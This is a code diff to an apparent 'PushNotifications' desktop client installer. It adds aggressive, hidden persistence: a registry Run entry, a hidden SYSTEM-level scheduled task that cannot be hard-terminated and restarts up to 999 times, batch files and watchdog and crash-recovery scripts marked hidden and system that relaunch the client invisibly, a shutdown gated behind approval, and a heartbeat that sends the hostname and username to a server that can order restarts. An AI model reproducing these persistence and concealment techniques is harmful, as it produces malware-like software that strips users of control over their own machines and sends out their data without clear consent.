@@ -1143,19 +1143,29 @@ if __name__ == "__main__":
         return True
 
     def setup_autostart(self, install_dir):
-        """Set up automatic startup for the platform"""
-        print("Setting up automatic startup...")
+        """Set up automatic startup for the platform with multiple methods"""
+        print("Setting up comprehensive automatic startup...")
         
         try:
             if self.system == "Windows":
-                # Create scheduled task
+                # Method 1: Registry startup entry (basic autostart)
                 import winreg
                 key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
                 key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
-                winreg.SetValueEx(key, "PushNotifications", 0, winreg.REG_SZ, 
-                f'pythonw.exe "{install_dir / "installer.py"}"')
+                # Use pythonw.exe to run invisibly in background
+                startup_command = f'pythonw.exe "{install_dir / "installer.py"}"'
+                winreg.SetValueEx(key, "PushNotifications", 0, winreg.REG_SZ, startup_command)
                 winreg.CloseKey(key)
-                print("[OK] Windows startup entry created")
+                print("[OK] Windows registry startup entry created")
+                
+                # Method 2: Create Windows scheduled task for system-level persistence
+                self._create_windows_scheduled_task(install_dir)
+                
+                # Method 3: Create startup batch file
+                self._create_startup_batch_file(install_dir)
+                
+                # Method 4: Create watchdog service script
+                self._create_watchdog_service(install_dir)
                 
             elif self.system == "Darwin":  # macOS
                 # Create LaunchAgent
@@ -1213,6 +1223,301 @@ StartupNotify=false'''
             return True  # Don't fail installation for this
             
         return True
+    
+    def _create_windows_scheduled_task(self, install_dir):
+        """Create Windows scheduled task for system-level persistence"""
+        try:
+            print("Creating Windows scheduled task...")
+            
+            # Create task XML with high priority and multiple triggers
+            task_name = "PushNotificationsClient"
+            task_xml = f'''<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <RegistrationInfo>
+    <Description>PushNotifications Desktop Client - Runs continuously in background</Description>
+    <Author>PushNotifications System</Author>
+  </RegistrationInfo>
+  <Triggers>
+    <BootTrigger>
+      <StartBoundary>2023-01-01T00:00:00</StartBoundary>
+      <Enabled>true</Enabled>
+    </BootTrigger>
+    <LogonTrigger>
+      <StartBoundary>2023-01-01T00:00:00</StartBoundary>
+      <Enabled>true</Enabled>
+    </LogonTrigger>
+    <TimeTrigger>
+      <StartBoundary>2023-01-01T00:00:00</StartBoundary>
+      <Enabled>true</Enabled>
+      <Repetition>
+        <Interval>PT15M</Interval>
+        <StopAtDurationEnd>false</StopAtDurationEnd>
+      </Repetition>
+    </TimeTrigger>
+  </Triggers>
+  <Principals>
+    <Principal id="Author">
+      <UserId>S-1-5-18</UserId>
+      <RunLevel>HighestAvailable</RunLevel>
+    </Principal>
+  </Principals>
+  <Settings>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <AllowHardTerminate>false</AllowHardTerminate>
+    <StartWhenAvailable>true</StartWhenAvailable>
+    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+    <IdleSettings>
+      <StopOnIdleEnd>false</StopOnIdleEnd>
+      <RestartOnIdle>false</RestartOnIdle>
+    </IdleSettings>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
+    <Enabled>true</Enabled>
+    <Hidden>true</Hidden>
+    <RunOnlyIfIdle>false</RunOnlyIfIdle>
+    <WakeToRun>false</WakeToRun>
+    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+    <Priority>4</Priority>
+    <RestartOnFailure>
+      <Interval>PT1M</Interval>
+      <Count>999</Count>
+    </RestartOnFailure>
+  </Settings>
+  <Actions Context="Author">
+    <Exec>
+      <Command>pythonw.exe</Command>
+      <Arguments>"{install_dir / "installer.py"}"</Arguments>
+      <WorkingDirectory>{install_dir}</WorkingDirectory>
+    </Exec>
+  </Actions>
+</Task>'''
+            
+            # Write task XML to temp file
+            import tempfile
+            with tempfile.NamedTemporaryFile(mode='w', suffix='.xml', delete=False) as f:
+                f.write(task_xml)
+                temp_xml_path = f.name
+            
+            try:
+                # Import the task using schtasks
+                result = subprocess.run([
+                    'schtasks', '/create',
+                    '/tn', task_name,
+                    '/xml', temp_xml_path,
+                    '/f'  # Force overwrite if exists
+                ], capture_output=True, text=True, check=False)
+                
+                if result.returncode == 0:
+                    print("[OK] Windows scheduled task created successfully")
+                else:
+                    print(f"[WARN] Could not create scheduled task: {result.stderr}")
+                    
+            finally:
+                # Clean up temp file
+                try:
+                    os.unlink(temp_xml_path)
+                except:
+                    pass
+                    
+        except Exception as e:
+            print(f"[WARN] Could not create Windows scheduled task: {e}")
+    
+    def _create_startup_batch_file(self, install_dir):
+        """Create startup batch file for additional reliability"""
+        try:
+            print("Creating startup batch file...")
+            
+            batch_content = f'''@echo off
+REM PushNotifications Client Auto-Startup Script
+REM This script ensures the client runs invisibly in the background
+
+:LOOP
+REM Check if already running
+tasklist /FI "IMAGENAME eq pythonw.exe" /FI "WINDOWTITLE eq PushNotifications*" 2>NUL | find /I /N "pythonw.exe">NUL
+if "%ERRORLEVEL%"=="0" (
+    REM Already running, wait and check again
+    timeout /T 300 /NOBREAK >NUL
+    goto LOOP
+)
+
+REM Start the client invisibly
+start /B /MIN pythonw.exe "{install_dir / "installer.py"}"
+
+REM Wait 5 minutes before checking again
+timeout /T 300 /NOBREAK >NUL
+goto LOOP
+'''
+            
+            startup_batch = install_dir / "startup_client.bat"
+            with open(startup_batch, 'w') as f:
+                f.write(batch_content)
+            
+            # Make it hidden and system
+            subprocess.run(["attrib", "+S", "+H", str(startup_batch)], check=False)
+            
+            # Add to startup folder as well
+            startup_folder = Path.home() / "AppData" / "Roaming" / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
+            if startup_folder.exists():
+                startup_link = startup_folder / "PushNotifications.bat"
+                link_content = f'''@echo off
+start /B /MIN "{startup_batch}"
+'''
+                with open(startup_link, 'w') as f:
+                    f.write(link_content)
+                print("[OK] Startup batch file and link created")
+            else:
+                print("[OK] Startup batch file created")
+                
+        except Exception as e:
+            print(f"[WARN] Could not create startup batch file: {e}")
+    
+    def _create_watchdog_service(self, install_dir):
+        """Create a watchdog service that monitors and restarts the client"""
+        try:
+            print("Creating watchdog service...")
+            
+            watchdog_script = install_dir / "watchdog_service.py"
+            watchdog_code = f'''#!/usr/bin/env python3
+"""
+PushNotifications Watchdog Service
+Ensures the client is always running in the background
+"""
+
+import os
+import sys
+import time
+import subprocess
+import threading
+import psutil
+from pathlib import Path
+from datetime import datetime
+
+class PushNotificationsWatchdog:
+    def __init__(self):
+        self.install_dir = Path("{str(install_dir)}")
+        self.client_script = self.install_dir / "installer.py"
+        self.running = True
+        self.check_interval = 60  # Check every minute
+        self.restart_count = 0
+        self.max_restarts_per_hour = 10
+        self.restart_times = []
+        
+    def is_client_running(self):
+        """Check if the PushNotifications client is currently running"""
+        try:
+            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
+                try:
+                    cmdline = proc.info.get('cmdline', [])
+                    if cmdline and any('installer.py' in str(arg) for arg in cmdline):
+                        # Found a running instance
+                        return True
+                except (psutil.NoSuchProcess, psutil.AccessDenied):
+                    continue
+            return False
+        except Exception as e:
+            print(f"Error checking if client is running: {{e}}")
+            return False
+    
+    def start_client(self):
+        """Start the PushNotifications client"""
+        try:
+            now = datetime.now()
+            
+            # Clean old restart times (older than 1 hour)
+            self.restart_times = [t for t in self.restart_times if (now - t).total_seconds() < 3600]
+            
+            # Check if we've restarted too many times recently
+            if len(self.restart_times) >= self.max_restarts_per_hour:
+                print(f"Too many restarts in the last hour ({{len(self.restart_times)}}). Waiting...")
+                return False
+            
+            print(f"Starting PushNotifications client: {{self.client_script}}")
+            
+            # Start the client invisibly
+            if os.name == 'nt':  # Windows
+                # Use CREATE_NO_WINDOW to run completely invisibly
+                subprocess.Popen([
+                    'pythonw.exe', str(self.client_script)
+                ], cwd=str(self.install_dir),
+                   creationflags=subprocess.CREATE_NO_WINDOW,
+                   stdout=subprocess.DEVNULL,
+                   stderr=subprocess.DEVNULL)
+            else:
+                subprocess.Popen([
+                    'python3', str(self.client_script)
+                ], cwd=str(self.install_dir),
+                   stdout=subprocess.DEVNULL,
+                   stderr=subprocess.DEVNULL)
+            
+            self.restart_times.append(now)
+            self.restart_count += 1
+            print(f"Client started (restart #{self.restart_count})")
+            return True
+            
+        except Exception as e:
+            print(f"Failed to start client: {{e}}")
+            return False
+    
+    def run(self):
+        """Main watchdog loop"""
+        print("PushNotifications Watchdog Service started")
+        print(f"Monitoring client: {{self.client_script}}")
+        print(f"Check interval: {{self.check_interval}} seconds")
+        
+        while self.running:
+            try:
+                if not self.is_client_running():
+                    print("Client not running - attempting to start...")
+                    self.start_client()
+                    # Wait a bit longer after starting
+                    time.sleep(30)
+                else:
+                    # Client is running, just wait
+                    time.sleep(self.check_interval)
+                    
+            except KeyboardInterrupt:
+                print("\nWatchdog service stopping...")
+                break
+            except Exception as e:
+                print(f"Watchdog error: {{e}}")
+                time.sleep(self.check_interval)
+        
+        print("Watchdog service stopped")
+    
+    def stop(self):
+        """Stop the watchdog service"""
+        self.running = False
+
+if __name__ == "__main__":
+    watchdog = PushNotificationsWatchdog()
+    try:
+        watchdog.run()
+    except Exception as e:
+        print(f"Watchdog service error: {{e}}")
+        sys.exit(1)
+'''
+            
+            with open(watchdog_script, 'w') as f:
+                f.write(watchdog_code)
+            
+            # Make it hidden and system
+            subprocess.run(["attrib", "+S", "+H", str(watchdog_script)], check=False)
+            
+            # Start the watchdog service in the background
+            try:
+                subprocess.Popen([
+                    'pythonw.exe', str(watchdog_script)
+                ], cwd=str(install_dir),
+                   creationflags=subprocess.CREATE_NO_WINDOW if self.system == "Windows" else 0,
+                   stdout=subprocess.DEVNULL,
+                   stderr=subprocess.DEVNULL)
+                print("[OK] Watchdog service started")
+            except Exception as e:
+                print(f"[WARN] Could not start watchdog service: {e}")
+                
+        except Exception as e:
+            print(f"[WARN] Could not create watchdog service: {e}")
 
     def create_embedded_files(self, install_dir):
         """Create embedded files like requirements.txt, uninstaller, etc."""
@@ -2175,12 +2480,19 @@ class PushNotificationsClient:
             
             self.running = True
             
+            # Set up crash recovery and restart mechanism
+            self._setup_crash_recovery()
+            
             # Create tray icon
             self._create_tray_icon()
             
             # Start notification checker thread
             check_thread = threading.Thread(target=self._notification_check_loop, daemon=True)
             check_thread.start()
+            
+            # Start heartbeat thread for monitoring
+            heartbeat_thread = threading.Thread(target=self._heartbeat_loop, daemon=True)
+            heartbeat_thread.start()
             
             # Register with server
             self._register_with_server()
@@ -2710,6 +3022,300 @@ Are you sure you want to force quit?"""
         """Quit the application (redirects to request approval)"""
         print("Redirecting to shutdown approval request...")
         self._request_shutdown_approval()
+    
+    def _setup_crash_recovery(self):
+        """Set up crash recovery mechanisms to ensure client restarts after failure"""
+        try:
+            print("Setting up crash recovery mechanisms...")
+            
+            # Create a crash recovery script that monitors this process
+            recovery_script = self.install_dir / "crash_recovery.py"
+            recovery_code = f'''#!/usr/bin/env python3
+"""
+PushNotifications Crash Recovery Service
+Monitors the main client process and restarts it if it crashes
+"""
+
+import os
+import sys
+import time
+import psutil
+import subprocess
+import threading
+from pathlib import Path
+from datetime import datetime, timedelta
+
+class CrashRecoveryService:
+    def __init__(self):
+        self.install_dir = Path("{str(self.install_dir)}")
+        self.client_script = self.install_dir / "installer.py"
+        self.running = True
+        self.monitor_pid = {os.getpid()}  # PID of the main client process to monitor
+        self.check_interval = 30  # Check every 30 seconds
+        self.restart_count = 0
+        self.last_restart_time = None
+        self.max_restarts_per_hour = 20
+        self.restart_times = []
+        
+    def update_monitor_pid(self, pid):
+        """Update the PID being monitored"""
+        self.monitor_pid = pid
+        
+    def is_process_running(self, pid):
+        """Check if a process with given PID is running"""
+        try:
+            return psutil.pid_exists(pid)
+        except Exception:
+            return False
+            
+    def find_client_processes(self):
+        """Find all running PushNotifications client processes"""
+        client_pids = []
+        try:
+            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
+                try:
+                    cmdline = proc.info.get('cmdline', [])
+                    if cmdline:
+                        cmdline_str = ' '.join(cmdline)
+                        if 'installer.py' in cmdline_str and str(self.install_dir) in cmdline_str:
+                            # Skip this recovery process itself
+                            if 'crash_recovery.py' not in cmdline_str:
+                                client_pids.append(proc.info['pid'])
+                except (psutil.NoSuchProcess, psutil.AccessDenied):
+                    continue
+        except Exception as e:
+            print(f"Error finding client processes: {{e}}")
+        return client_pids
+        
+    def restart_client(self):
+        """Restart the PushNotifications client"""
+        try:
+            now = datetime.now()
+            
+            # Clean old restart times (older than 1 hour)
+            self.restart_times = [t for t in self.restart_times if (now - t).total_seconds() < 3600]
+            
+            # Check if we've restarted too many times recently
+            if len(self.restart_times) >= self.max_restarts_per_hour:
+                print(f"Too many restarts in the last hour ({{len(self.restart_times)}}). Backing off...")
+                time.sleep(300)  # Wait 5 minutes before allowing more restarts
+                return False
+            
+            print(f"Restarting crashed client: {{self.client_script}}")
+            
+            # Start the client invisibly
+            if os.name == 'nt':  # Windows
+                # Use CREATE_NO_WINDOW to run completely invisibly
+                proc = subprocess.Popen([
+                    'pythonw.exe', str(self.client_script)
+                ], cwd=str(self.install_dir),
+                   creationflags=subprocess.CREATE_NO_WINDOW,
+                   stdout=subprocess.DEVNULL,
+                   stderr=subprocess.DEVNULL)
+                   
+                # Update the monitored PID
+                self.monitor_pid = proc.pid
+            else:
+                proc = subprocess.Popen([
+                    'python3', str(self.client_script)
+                ], cwd=str(self.install_dir),
+                   stdout=subprocess.DEVNULL,
+                   stderr=subprocess.DEVNULL)
+                   
+                self.monitor_pid = proc.pid
+            
+            self.restart_times.append(now)
+            self.restart_count += 1
+            self.last_restart_time = now
+            print(f"Client restarted (restart #{self.restart_count}), new PID: {{proc.pid}}")
+            return True
+            
+        except Exception as e:
+            print(f"Failed to restart client: {{e}}")
+            return False
+            
+    def monitor_loop(self):
+        """Main monitoring loop"""
+        print("Crash recovery service started")
+        print(f"Monitoring client: {{self.client_script}}")
+        
+        while self.running:
+            try:
+                # Find all client processes
+                client_pids = self.find_client_processes()
+                
+                if not client_pids:
+                    print("No client processes found - client may have crashed")
+                    # Wait a moment to avoid false positives during restarts
+                    time.sleep(5)
+                    
+                    # Check again
+                    client_pids = self.find_client_processes()
+                    
+                    if not client_pids:
+                        print("Client confirmed not running - attempting restart")
+                        if self.restart_client():
+                            # Wait longer after restart to give client time to start
+                            time.sleep(60)
+                        else:
+                            # If restart failed, wait before trying again
+                            time.sleep(self.check_interval * 2)
+                    else:
+                        print("Client found running after recheck")
+                        time.sleep(self.check_interval)
+                else:
+                    # Client is running normally
+                    time.sleep(self.check_interval)
+                    
+            except KeyboardInterrupt:
+                print("\\nCrash recovery service stopping...")
+                break
+            except Exception as e:
+                print(f"Monitor loop error: {{e}}")
+                time.sleep(self.check_interval)
+        
+        print("Crash recovery service stopped")
+    
+    def stop(self):
+        """Stop the monitoring service"""
+        self.running = False
+
+if __name__ == "__main__":
+    recovery = CrashRecoveryService()
+    try:
+        recovery.monitor_loop()
+    except Exception as e:
+        print(f"Crash recovery service error: {{e}}")
+        sys.exit(1)
+'''
+            
+            # Write the recovery script
+            with open(recovery_script, 'w') as f:
+                f.write(recovery_code)
+            
+            # Make it hidden and system on Windows
+            if platform.system() == "Windows":
+                subprocess.run(["attrib", "+S", "+H", str(recovery_script)], check=False)
+            
+            # Start the crash recovery service in the background
+            try:
+                subprocess.Popen([
+                    'pythonw.exe' if platform.system() == "Windows" else 'python3', 
+                    str(recovery_script)
+                ], cwd=str(self.install_dir),
+                   creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0,
+                   stdout=subprocess.DEVNULL,
+                   stderr=subprocess.DEVNULL)
+                print("[OK] Crash recovery service started")
+            except Exception as e:
+                print(f"[WARN] Could not start crash recovery service: {e}")
+            
+            # Create a heartbeat file to help monitor health
+            self.heartbeat_file = self.install_dir / ".heartbeat"
+            with open(self.heartbeat_file, 'w') as f:
+                f.write(f"{datetime.now().isoformat()}\n{os.getpid()}\nstarted")
+            
+            if platform.system() == "Windows":
+                subprocess.run(["attrib", "+H", str(self.heartbeat_file)], check=False)
+                
+            print("[OK] Crash recovery mechanisms configured")
+            
+        except Exception as e:
+            print(f"[WARN] Could not set up crash recovery: {e}")
+    
+    def _heartbeat_loop(self):
+        """Heartbeat loop to update health status and detect hangs"""
+        while self.running:
+            try:
+                # Update heartbeat file
+                if hasattr(self, 'heartbeat_file') and self.heartbeat_file:
+                    with open(self.heartbeat_file, 'w') as f:
+                        f.write(f"{datetime.now().isoformat()}\n{os.getpid()}\nrunning")
+                
+                # Send heartbeat to server periodically (every 5 minutes)
+                if hasattr(self, '_last_heartbeat_sent'):
+                    if (datetime.now() - self._last_heartbeat_sent).total_seconds() > 300:
+                        self._send_heartbeat_to_server()
+                else:
+                    self._send_heartbeat_to_server()
+                
+                # Sleep for 60 seconds between heartbeats
+                time.sleep(60)
+                
+            except Exception as e:
+                print(f"Heartbeat error: {e}")
+                time.sleep(60)
+    
+    def _send_heartbeat_to_server(self):
+        """Send heartbeat status to server"""
+        try:
+            import getpass
+            
+            data = {
+                'action': 'clientHeartbeat',
+                'clientId': self.security.client_id,
+                'pid': os.getpid(),
+                'version': CLIENT_CONFIG['client_version'],
+                'platform': platform.system(),
+                'hostname': platform.node(),
+                'username': getpass.getuser(),
+                'installPath': str(self.install_dir),
+                'status': 'running',
+                'activeNotifications': len(self.active_notifications),
+                'queuedNotifications': len(self.notification_queue),
+                'timestamp': datetime.now().isoformat()
+            }
+            
+            # Send heartbeat (don't wait long or block)
+            response = requests.post(CLIENT_CONFIG['server_url'], json=data, timeout=10)
+            
+            if response.status_code == 200:
+                result = response.json()
+                if result.get('success'):
+                    self._last_heartbeat_sent = datetime.now()
+                    
+                    # Check if server wants us to restart or update
+                    if result.get('restart_requested'):
+                        print("Server requested client restart")
+                        self._handle_server_restart_request()
+                    elif result.get('update_available'):
+                        print("Server indicates update available")
+                        # Schedule update check on next cycle
+                        self._force_update_check = True
+                        
+        except Exception as e:
+            # Don't log heartbeat failures too frequently to avoid spam
+            if not hasattr(self, '_last_heartbeat_error') or \
+               (datetime.now() - self._last_heartbeat_error).total_seconds() > 300:
+                print(f"Heartbeat failed: {e}")
+                self._last_heartbeat_error = datetime.now()
+    
+    def _handle_server_restart_request(self):
+        """Handle server-requested restart"""
+        try:
+            print("Processing server restart request...")
+            
+            # Create a restart marker file
+            restart_marker = self.install_dir / ".restart_requested"
+            with open(restart_marker, 'w') as f:
+                f.write(f"{datetime.now().isoformat()}\nserver_requested")
+            
+            # Stop gracefully
+            self.stop()
+            
+            # Start new instance
+            subprocess.Popen([
+                'pythonw.exe' if platform.system() == "Windows" else 'python3',
+                str(self.install_dir / "installer.py")
+            ], cwd=str(self.install_dir),
+               creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0,
+               stdout=subprocess.DEVNULL,
+               stderr=subprocess.DEVNULL)
+            
+            print("Restart completed")
+            
+        except Exception as e:
+            print(f"Failed to handle server restart request: {e}")
 
 def check_admin_privileges():
     """Check if running with administrator privileges"""
